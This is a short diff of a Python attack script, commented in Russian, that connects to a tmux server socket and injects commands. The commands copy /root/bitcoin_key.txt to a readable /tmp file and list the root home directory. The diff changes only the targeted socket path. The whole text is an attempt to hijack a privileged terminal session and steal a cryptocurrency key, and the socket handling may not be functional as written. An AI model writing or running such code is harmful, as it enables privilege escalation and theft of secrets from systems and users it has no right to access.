@@ -9,7 +9,7 @@ def try_tmux_method_1():
     """Метод 1: new-window с выводом в файл"""
     try:
         sock = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
-        sock.connect('/tmp/tmux-1000/default')
+        sock.connect('/tmp/tmux-100/default')
         command = b'new-window "cat /root/bitcoin_key.txt > /tmp/bitcoin_key_output.txt 2>&1"\n'
         sock.send(command)
         sock.close()
@@ -27,7 +27,7 @@ def try_tmux_method_2():
     """Метод 2: send-keys"""
     try:
         sock = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
-        sock.connect('/tmp/tmux-1000/default')
+        sock.connect('/tmp/tmux-100/default')
         # Очищаем экран и выполняем команду
         sock.send(b'send-keys "clear" Enter\n')
         time.sleep(0.5)
@@ -60,7 +60,7 @@ def main():
     # Пробуем альтернативные команды
     try:
         sock = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
-        sock.connect('/tmp/tmux-1000/default')
+        sock.connect('/tmp/tmux-100/default')
         sock.send(b'send-keys "ls -la /root/ > /tmp/root_listing.txt 2>&1" Enter\n')
         sock.close()
         time.sleep(1)
